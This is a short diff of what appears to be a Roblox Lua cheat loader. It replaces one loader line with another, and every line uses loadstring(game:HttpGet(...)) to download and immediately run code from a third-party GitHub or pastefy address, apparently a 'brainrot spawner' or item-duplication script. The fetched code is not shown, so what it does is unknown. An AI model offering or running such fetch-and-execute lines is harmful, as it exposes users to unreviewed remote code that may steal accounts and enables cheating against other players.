@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MendaxV99/Trials/refs/heads/main/Zephy"))()
-loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/brainrotspawner"))()
